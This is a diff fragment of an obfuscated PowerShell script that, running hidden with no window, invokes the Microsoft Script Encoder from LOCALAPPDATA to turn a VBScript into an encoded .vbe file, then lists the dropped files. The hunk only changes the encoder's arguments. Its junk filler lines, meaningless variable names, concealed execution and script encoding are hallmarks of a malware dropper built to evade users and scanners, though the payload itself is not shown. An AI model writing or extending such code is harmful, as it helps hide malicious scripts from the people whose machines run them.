@@ -47,7 +47,7 @@ $v111=2*5-1
 If($v111>0){}
 $v112=Join-Path $env:LOCALAPPDATA "screnc.exe"
 $v113=Join-Path $env:LOCALAPPDATA "1446062403_house.vbe"
-If(Test-Path $v112){$v114=New-Object System.Diagnostics.ProcessStartInfo;$v114.FileName=$v112;$v114.Arguments="/s /f /tp=v /e=vbs /op=s /ret=15 `"$v99`" `"$v113`"";$v114.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;$v114.CreateNoWindow=$true;$v114.UseShellExecute=$false;$v115=[System.Diagnostics.Process]::Start($v114);$v115.WaitForExit()}
+If(Test-Path $v112){$v114=New-Object System.Diagnostics.ProcessStartInfo;$v114.FileName=$v112;$v114.Arguments="/s /f /tp=v /e=vbs `"$v99`" `"$v113`"";$v114.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;$v114.CreateNoWindow=$true;$v114.UseShellExecute=$false;$v115=[System.Diagnostics.Process]::Start($v114);$v115.WaitForExit()}
 $v116=9-3+1
 If($v116>0){}
 $v117=@((Join-Path $env:LOCALAPPDATA "1446062403_house"),(Join-Path $env:LOCALAPPDATA "ScrEncGui.exe"),(Join-Path $env:LOCALAPPDATA "screnc.exe"))
